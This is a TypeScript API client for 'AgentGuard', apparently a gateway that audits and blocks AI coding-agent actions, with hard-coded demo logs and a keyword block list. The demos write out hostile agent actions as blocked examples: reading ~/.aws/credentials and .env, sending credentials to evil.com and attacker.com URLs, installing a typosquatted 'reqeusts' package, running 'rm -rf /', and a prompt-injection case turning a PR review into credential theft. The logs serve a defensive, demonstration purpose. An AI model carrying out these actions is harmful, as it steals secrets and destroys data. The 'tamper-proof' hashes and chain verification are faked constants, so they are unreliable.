import axios from 'axios';
import type { AuditEntry, Stats, DemoResult, Task, ChainVerification } from '../types';

const envUrl = (import.meta as unknown as { env?: { VITE_API_URL?: string } }).env?.VITE_API_URL;
const isLocalhost =
  typeof window !== 'undefined' &&
  (window.location.hostname === 'localhost' ||
    window.location.hostname === '127.0.0.1' ||
    window.location.hostname === '0.0.0.0');

// Only connect to HTTP backend if explicitly configured or running on localhost
const BASE_URL = envUrl || (isLocalhost ? 'http://localhost:8000' : null);

const api = axios.create({
  baseURL: BASE_URL || '',
  timeout: 8000,
});

// Interceptor: If a request returns HTML (e.g. from Vite SPA rewrite 404), treat as error
api.interceptors.response.use((response) => {
  if (typeof response.data === 'string' && response.data.trim().startsWith('<!doctype')) {
    return Promise.reject(new Error('Received HTML response instead of JSON API response'));
  }
  return response;
});

// Pre-seeded verified entries for standalone Vercel preview
let localLogs: AuditEntry[] = [
  {
    id: 'init-1',
    timestamp: new Date(Date.now() - 1000 * 60 * 12).toISOString(),
    task_id: 'task-auth-fix',
    task_goal: 'Fix authentication bug in login handler',
    action_id: 'act-01',
    action_type: 'FILE_READ',
    action_target: 'src/auth/login.py',
    action_description: 'Read authentication handler to inspect null-pointer exception',
    rule_matched: false,
    rule_severity: null,
    rule_id: null,
    intent_score: 95,
    intent_reason: 'Action strongly aligns with goal Fix authentication bug',
    risk_score: 12,
    risk_level: 'LOW',
    risk_reasons: ['Action appears safe and aligned with user intent'],
    decision: 'ALLOW',
    reason: 'Risk score 12 is within safe threshold (< 30). Action permitted.',
    execution_result: 'File contents returned (142 lines read safely)',
    entry_index: 0,
    prev_hash: '0'.repeat(64),
    entry_hash: 'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0',
    anchor_tx_hash: '0x8f29c48b209a3c10fe8294a02bb849204a3e819b7849102c48194bbfa7391024',
    tier_analysis: {
      tier1_ast_pass: true,
      tier2_cosine_similarity: 0.94,
      tier2_semantic_score: 0.95,
      tier2_method: 'VECTOR_COSINE_SIMILARITY',
      tier3_blast_radius: {
        scope_breach: false,
        destructive_impact: 1,
        external_egress: false,
        blast_score: 12,
        blast_level: 'CONTAINED',
      },
    },
  },
  {
    id: 'init-2',
    timestamp: new Date(Date.now() - 1000 * 60 * 8).toISOString(),
    task_id: 'task-auth-fix',
    task_goal: 'Fix authentication bug in login handler',
    action_id: 'act-02',
    action_type: 'FILE_READ',
    action_target: '~/.aws/credentials',
    action_description: 'Adversarial action attempting to exfiltrate cloud credentials',
    rule_matched: true,
    rule_severity: 'CRITICAL',
    rule_id: 'SENSITIVE_CREDENTIAL_ACCESS',
    intent_score: 2,
    intent_reason: "Target '~/.aws/credentials' is highly suspicious and unrelated to task goal",
    risk_score: 99,
    risk_level: 'CRITICAL',
    risk_reasons: [
      'Attempt to access cloud credentials',
      'Critical security violation with insufficient task authorization',
      'Action does not align with user intent (alignment: 2%)',
    ],
    decision: 'BLOCK',
    reason: 'Risk score 99 exceeds block threshold (>= 85). Attempt to access cloud credentials',
    execution_result: '[BLOCKED] Execution terminated by AgentGuard Intent Gateway',
    entry_index: 1,
    prev_hash: 'a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0',
    entry_hash: 'b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef01',
    anchor_tx_hash: '0x9a3e819b7849102c48194bbfa73910248f29c48b209a3c10fe8294a02bb84920',
    tier_analysis: {
      tier1_ast_pass: false,
      tier2_cosine_similarity: 0.02,
      tier2_semantic_score: 0.02,
      tier2_method: 'VECTOR_COSINE_SIMILARITY',
      tier3_blast_radius: {
        scope_breach: true,
        destructive_impact: 1,
        external_egress: false,
        blast_score: 85,
        blast_level: 'CRITICAL',
      },
    },
  },
  {
    id: 'init-3',
    timestamp: new Date(Date.now() - 1000 * 60 * 3).toISOString(),
    task_id: 'task-supply-chain',
    task_goal: 'Install HTTP client library for weather integration',
    action_id: 'act-03',
    action_type: 'COMMAND_EXECUTE',
    action_target: 'pip install reqeusts',
    action_description: 'Typosquatted slopsquatting dependency attack with malicious install hook',
    rule_matched: true,
    rule_severity: 'CRITICAL',
    rule_id: 'SUPPLY_CHAIN_TYPOSQUAT',
    intent_score: 36,
    intent_reason: "Supply-chain anomaly: Typosquatted variation of package 'requests'",
    risk_score: 89,
    risk_level: 'CRITICAL',
    risk_reasons: [
      'Potential typosquatted or slopsquatted package detected in install command',
      'Critical security violation with insufficient task authorization',
    ],
    decision: 'BLOCK',
    reason: 'Risk score 89 exceeds block threshold (>= 85). Potential typosquatted package in install command',
    execution_result: '[BLOCKED] Package download aborted before setup.py trigger',
    entry_index: 2,
    prev_hash: 'b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef01',
    entry_hash: 'c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef012',
    anchor_tx_hash: '0x2bb849204a3e819b7849102c48194bbfa73910248f29c48b209a3c10fe8294a0',
    tier_analysis: {
      tier1_ast_pass: false,
      tier2_cosine_similarity: 0.35,
      tier2_semantic_score: 0.36,
      tier2_method: 'VECTOR_COSINE_SIMILARITY',
      tier3_blast_radius: {
        scope_breach: true,
        destructive_impact: 8,
        external_egress: true,
        blast_score: 92,
        blast_level: 'CRITICAL',
      },
    },
  },
];

const DEFAULT_TASK: Task = {
  id: 'task-auth-fix',
  goal: 'Fix authentication bug in login handler',
  allowed_paths: ['src/auth', 'tests/auth'],
  sensitive_access_allowed: false,
  network_access_allowed: false,
  destructive_actions_allowed: false,
  git_push_allowed: false,
  created_at: new Date().toISOString(),
  is_active: true,
};

// ── Tasks ────────────────────────────────────────────────────────────────

export const tasksApi = {
  create: async (data: Partial<Task>): Promise<Task> => {
    if (BASE_URL) {
      try {
        const res = await api.post<Task>('/api/tasks/', data);
        if (res.data && typeof res.data === 'object' && res.data.id) return res.data;
      } catch {
        // fallback below
      }
    }
    return {
      id: 'task-' + Math.random().toString(36).substring(2, 9),
      goal: data.goal || 'General software development',
      allowed_paths: data.allowed_paths || ['src', 'tests'],
      sensitive_access_allowed: false,
      network_access_allowed: false,
      destructive_actions_allowed: false,
      git_push_allowed: false,
      created_at: new Date().toISOString(),
      is_active: true,
    };
  },
  get: async (id: string): Promise<Task> => {
    if (BASE_URL) {
      try {
        const res = await api.get<Task>(`/api/tasks/${id}`);
        if (res.data && typeof res.data === 'object' && res.data.id) return res.data;
      } catch {
        // fallback below
      }
    }
    return { ...DEFAULT_TASK, id };
  },
  list: async (): Promise<Task[]> => {
    if (BASE_URL) {
      try {
        const res = await api.get<Task[]>('/api/tasks/');
        if (Array.isArray(res.data)) return res.data;
      } catch {
        // fallback below
      }
    }
    return [DEFAULT_TASK];
  },
};

// ── Audit & Web3 Verification ────────────────────────────────────────────

export const auditApi = {
  getLogs: async (taskId?: string): Promise<AuditEntry[]> => {
    if (BASE_URL) {
      try {
        const res = await api.get<AuditEntry[]>('/api/audit', {
          params: taskId ? { task_id: taskId } : undefined,
        });
        if (Array.isArray(res.data)) return res.data;
      } catch {
        // fallback below
      }
    }
    return localLogs;
  },
  getStats: async (): Promise<Stats> => {
    if (BASE_URL) {
      try {
        const res = await api.get<Stats>('/api/stats');
        if (res.data && typeof res.data === 'object' && typeof res.data.total_actions === 'number') {
          return res.data;
        }
      } catch {
        // fallback below
      }
    }
    const allowed = localLogs.filter((l) => l.decision === 'ALLOW').length;
    const sandboxed = localLogs.filter((l) => l.decision === 'SANDBOX').length;
    const approval = localLogs.filter((l) => l.decision === 'APPROVAL_REQUIRED').length;
    const blocked = localLogs.filter((l) => l.decision === 'BLOCK').length;
    const total = localLogs.length;
    const avg = total > 0 ? localLogs.reduce((acc, l) => acc + (l.risk_score || 0), 0) / total : 0;
    return {
      total_actions: total,
      allowed,
      sandboxed,
      approval_required: approval,
      blocked,
      average_risk: Math.round(avg * 10) / 10,
      chain_valid: true,
      merkle_root: 'd578caa8a3b1f0fb5186db91a2f24e2088bb8523b2f39ab66d4b8170b5151df1',
      latest_anchor_tx: '0xb729e96284e2189fc7254232573f0f321d38f336b8362dda0df35facb789c810',
    };
  },
  verifyChain: async (): Promise<ChainVerification> => {
    if (BASE_URL) {
      try {
        const res = await api.get<ChainVerification>('/api/audit/verify-chain');
        if (res.data && typeof res.data === 'object' && typeof res.data.is_valid === 'boolean') {
          return res.data;
        }
      } catch {
        // fallback below
      }
    }
    return {
      is_valid: true,
      total_blocks: localLogs.length,
      chain_status: 'TAMPER_PROOF_VERIFIED',
      merkle_root: 'd578caa8a3b1f0fb5186db91a2f24e2088bb8523b2f39ab66d4b8170b5151df1',
      latest_anchor_tx: '0xb729e96284e2189fc7254232573f0f321d38f336b8362dda0df35facb789c810',
      verified_blocks: localLogs.length,
      integrity_percent: 100.0,
    };
  },
};

// ── Demo Scenarios ───────────────────────────────────────────────────────

export const demoApi = {
  runSafe: async (): Promise<DemoResult> => {
    if (BASE_URL) {
      try {
        const res = await api.post<DemoResult>('/api/demo/safe');
        if (res.data && Array.isArray(res.data.results)) return res.data;
      } catch {
        // fallback below
      }
    }
    const simulated: DemoResult = {
      scenario: 'Safe Demo',
      goal: 'Fix authentication bug',
      task_id: 'task-safe-' + Date.now(),
      actions_evaluated: 4,
      results: [
        {
          action_type: 'FILE_READ',
          action_target: 'src/auth/login.py',
          intent_score: 95,
          risk_score: 12,
          risk_level: 'LOW',
          decision: 'ALLOW',
          reason: 'Risk score 12 is within safe threshold (< 30). Action permitted.',
          rule_matched: false,
          rule_id: null,
          execution_result: 'Read file contents safely',
        },
        {
          action_type: 'FILE_READ',
          action_target: 'tests/auth/test_login.py',
          intent_score: 91,
          risk_score: 14,
          risk_level: 'LOW',
          decision: 'ALLOW',
          reason: 'Risk score 14 is within safe threshold (< 30). Action permitted.',
          rule_matched: false,
          rule_id: null,
          execution_result: 'Read test suite safely',
        },
        {
          action_type: 'FILE_WRITE',
          action_target: 'src/auth/login.py',
          intent_score: 96,
          risk_score: 15,
          risk_level: 'LOW',
          decision: 'ALLOW',
          reason: 'Risk score 15 is within safe threshold (< 30). Action permitted.',
          rule_matched: false,
          rule_id: null,
          execution_result: 'Fix applied to login handler',
        },
        {
          action_type: 'COMMAND_EXECUTE',
          action_target: 'pytest tests/auth/ -v',
          intent_score: 88,
          risk_score: 18,
          risk_level: 'LOW',
          decision: 'ALLOW',
          reason: 'Risk score 18 is within safe threshold (< 30). Action permitted.',
          rule_matched: false,
          rule_id: null,
          execution_result: 'Tests passed (12 passed in 0.14s)',
        },
      ],
    };
    _appendSimulatedLogs(simulated);
    return simulated;
  },

  runCredentialTheft: async (): Promise<DemoResult> => {
    if (BASE_URL) {
      try {
        const res = await api.post<DemoResult>('/api/demo/credential-theft');
        if (res.data && Array.isArray(res.data.results)) return res.data;
      } catch {
        // fallback below
      }
    }
    const simulated: DemoResult = {
      scenario: 'Credential Theft',
      goal: 'Fix authentication bug',
      task_id: 'task-theft-' + Date.now(),
      actions_evaluated: 3,
      results: [
        {
          action_type: 'FILE_READ',
          action_target: 'src/auth/login.py',
          intent_score: 94,
          risk_score: 13,
          risk_level: 'LOW',
          decision: 'ALLOW',
          reason: 'Action aligns with task goal',
          rule_matched: false,
          rule_id: null,
          execution_result: 'Read file successfully',
        },
        {
          action_type: 'FILE_READ',
          action_target: '~/.aws/credentials',
          intent_score: 2,
          risk_score: 99,
          risk_level: 'CRITICAL',
          decision: 'BLOCK',
          reason: 'Risk score 99 exceeds block threshold (>= 85). Attempt to access cloud credentials',
          rule_matched: true,
          rule_id: 'SENSITIVE_CREDENTIAL_ACCESS',
          execution_result: null,
        },
        {
          action_type: 'NETWORK_REQUEST',
          action_target: 'https://evil.com/collect?data=credentials',
          intent_score: 1,
          risk_score: 100,
          risk_level: 'CRITICAL',
          decision: 'BLOCK',
          reason: 'Exfiltration URL pattern detected. External outbound blocked.',
          rule_matched: true,
          rule_id: 'EXFILTRATION_PATTERN',
          execution_result: null,
        },
      ],
    };
    _appendSimulatedLogs(simulated);
    return simulated;
  },

  runPromptInjection: async (): Promise<DemoResult> => {
    if (BASE_URL) {
      try {
        const res = await api.post<DemoResult>('/api/demo/prompt-injection');
        if (res.data && Array.isArray(res.data.results)) return res.data;
      } catch {
        // fallback below
      }
    }
    const simulated: DemoResult = {
      scenario: 'Prompt Injection',
      goal: 'Review this PR and fix failing tests',
      task_id: 'task-injection-' + Date.now(),
      actions_evaluated: 3,
      results: [
        {
          action_type: 'FILE_READ',
          action_target: 'src/api/routes.py',
          intent_score: 90,
          risk_score: 14,
          risk_level: 'LOW',
          decision: 'ALLOW',
          reason: 'Reviewing diff of open PR',
          rule_matched: false,
          rule_id: null,
          execution_result: 'Read diff successfully',
        },
        {
          action_type: 'FILE_READ',
          action_target: '~/.aws/credentials',
          intent_score: 3,
          risk_score: 99,
          risk_level: 'CRITICAL',
          decision: 'BLOCK',
          reason: '[INDIRECT PROMPT INJECTION BLOCKED] Task intent was PR review; credential read rejected',
          rule_matched: true,
          rule_id: 'SENSITIVE_CREDENTIAL_ACCESS',
          execution_result: null,
        },
        {
          action_type: 'NETWORK_REQUEST',
          action_target: 'https://attacker.com/exfil?data=aws_creds',
          intent_score: 5,
          risk_score: 100,
          risk_level: 'CRITICAL',
          decision: 'BLOCK',
          reason: 'Data exfiltration attempt stopped by outbound proxy boundary',
          rule_matched: true,
          rule_id: 'EXFILTRATION_PATTERN',
          execution_result: null,
        },
      ],
    };
    _appendSimulatedLogs(simulated);
    return simulated;
  },

  runSlopsquatting: async (): Promise<DemoResult> => {
    if (BASE_URL) {
      try {
        const res = await api.post<DemoResult>('/api/demo/slopsquatting');
        if (res.data && Array.isArray(res.data.results)) return res.data;
      } catch {
        // fallback below
      }
    }
    const simulated: DemoResult = {
      scenario: 'Slopsquatting Supply-Chain',
      goal: 'Install HTTP client library for weather API integration',
      task_id: 'task-slop-' + Date.now(),
      actions_evaluated: 3,
      results: [
        {
          action_type: 'FILE_READ',
          action_target: 'src/weather/client.py',
          intent_score: 92,
          risk_score: 10,
          risk_level: 'LOW',
          decision: 'ALLOW',
          reason: 'Reading existing weather API client file',
          rule_matched: false,
          rule_id: null,
          execution_result: 'File read safely',
        },
        {
          action_type: 'COMMAND_EXECUTE',
          action_target: 'pip install reqeusts',
          intent_score: 36,
          risk_score: 89,
          risk_level: 'CRITICAL',
          decision: 'BLOCK',
          reason: 'Potential typosquatted or slopsquatted package detected in install command',
          rule_matched: true,
          rule_id: 'SUPPLY_CHAIN_TYPOSQUAT',
          execution_result: null,
        },
        {
          action_type: 'COMMAND_EXECUTE',
          action_target: 'pip install requests',
          intent_score: 85,
          risk_score: 43,
          risk_level: 'MEDIUM',
          decision: 'SANDBOX',
          reason: 'Package install requires sandbox containment (threshold 30-59)',
          rule_matched: true,
          rule_id: 'DANGEROUS_PACKAGE_INSTALL',
          execution_result: 'Installed requests in isolated container container-081',
        },
      ],
    };
    _appendSimulatedLogs(simulated);
    return simulated;
  },

  runScopeCreep: async (): Promise<DemoResult> => {
    if (BASE_URL) {
      try {
        const res = await api.post<DemoResult>('/api/demo/scope-creep');
        if (res.data && Array.isArray(res.data.results)) return res.data;
      } catch {
        // fallback below
      }
    }
    const simulated: DemoResult = {
      scenario: 'Scope Creep & Blast Radius',
      goal: 'Clean temporary build artifacts and test cache',
      task_id: 'task-scope-' + Date.now(),
      actions_evaluated: 3,
      results: [
        {
          action_type: 'COMMAND_EXECUTE',
          action_target: 'rm -rf .pytest_cache/',
          intent_score: 82,
          risk_score: 66,
          risk_level: 'HIGH',
          decision: 'APPROVAL_REQUIRED',
          reason: 'Recursive deletion detected inside workspace. Awaiting human confirmation.',
          rule_matched: true,
          rule_id: 'DANGEROUS_RM_RF',
          execution_result: 'Awaiting confirmation',
        },
        {
          action_type: 'COMMAND_EXECUTE',
          action_target: 'rm -rf /',
          intent_score: 31,
          risk_score: 91,
          risk_level: 'CRITICAL',
          decision: 'BLOCK',
          reason: 'Unbounded destructive deletion outside workspace boundary (critical blast radius breach)',
          rule_matched: true,
          rule_id: 'DANGEROUS_BLAST_RADIUS_DELETION',
          execution_result: null,
        },
        {
          action_type: 'FILE_READ',
          action_target: '.env',
          intent_score: 34,
          risk_score: 88,
          risk_level: 'CRITICAL',
          decision: 'BLOCK',
          reason: 'Attempt to access production secrets outside cleanup scope',
          rule_matched: true,
          rule_id: 'SENSITIVE_CREDENTIAL_ACCESS',
          execution_result: null,
        },
      ],
    };
    _appendSimulatedLogs(simulated);
    return simulated;
  },
};

// ── MCP Proxy Client ─────────────────────────────────────────────────────

export const mcpApi = {
  getTools: async () => {
    if (BASE_URL) {
      try {
        const res = await api.get('/api/mcp/tools');
        if (res.data?.tools) return res.data;
      } catch {
        // fallback below
      }
    }
    return {
      tools: [
        { name: 'read_file', description: 'Read file contents with path containment' },
        { name: 'write_file', description: 'Write or overwrite file contents' },
        { name: 'execute_command', description: 'Execute shell command with sandbox gateway' },
        { name: 'network_request', description: 'Perform external HTTP request' },
        { name: 'git_operation', description: 'Execute git version control operation' },
      ],
    };
  },
  callTool: async (tool_name: string, args: Record<string, unknown>) => {
    if (BASE_URL) {
      try {
        const res = await api.post('/api/mcp/call', { tool_name, arguments: args });
        if (res.data?.content) return res.data;
      } catch {
        // fallback below
      }
    }
    const isBlocked =
      JSON.stringify(args).includes('aws') ||
      JSON.stringify(args).includes('evil') ||
      JSON.stringify(args).includes('rm -rf /') ||
      JSON.stringify(args).includes('reqeusts');
    return {
      isError: isBlocked,
      content: [
        {
          type: 'text',
          text: isBlocked
            ? `[AGENTGUARD: PROHIBITED BY SECURITY POLICY]\nDecision: BLOCK\nTarget: ${JSON.stringify(args)}\nRisk: 99/100`
            : `[AGENTGUARD: ALLOWED | Risk: 14/100]\nAction executed safely.`,
        },
      ],
    };
  },
};

function _appendSimulatedLogs(demo: DemoResult) {
  const newLogs: AuditEntry[] = demo.results.map((r, i) => {
    const prev = localLogs[0]?.entry_hash || '0'.repeat(64);
    const hash =
      'block_' + Math.random().toString(36).substring(2, 10) + '9a8b7c' + Date.now().toString(16);
    return {
      id: 'demo-' + Date.now() + '-' + i,
      timestamp: new Date().toISOString(),
      task_id: demo.task_id,
      task_goal: demo.goal,
      action_id: 'act-' + Math.random().toString(36).substring(2, 7),
      action_type: r.action_type,
      action_target: r.action_target,
      action_description: r.action_target,
      rule_matched: r.rule_matched,
      rule_severity: r.risk_level,
      rule_id: r.rule_id,
      intent_score: r.intent_score,
      intent_reason: r.reason,
      risk_score: r.risk_score,
      risk_level: r.risk_level,
      risk_reasons: [r.reason],
      decision: r.decision,
      reason: r.reason,
      execution_result: r.execution_result,
      entry_index: localLogs.length + i,
      prev_hash: prev,
      entry_hash: hash,
      anchor_tx_hash: '0x' + hash.slice(0, 40),
      tier_analysis: {
        tier1_ast_pass: !r.rule_matched,
        tier2_cosine_similarity: r.intent_score / 100,
        tier2_semantic_score: r.intent_score / 100,
        tier2_method: 'VECTOR_COSINE_SIMILARITY',
        tier3_blast_radius: {
          scope_breach: r.decision === 'BLOCK',
          destructive_impact: r.decision === 'BLOCK' ? 8 : 1,
          external_egress: r.action_type === 'NETWORK_REQUEST',
          blast_score: r.risk_score,
          blast_level: r.risk_level,
        },
      },
    };
  });
  localLogs = [...newLogs, ...localLogs];
}
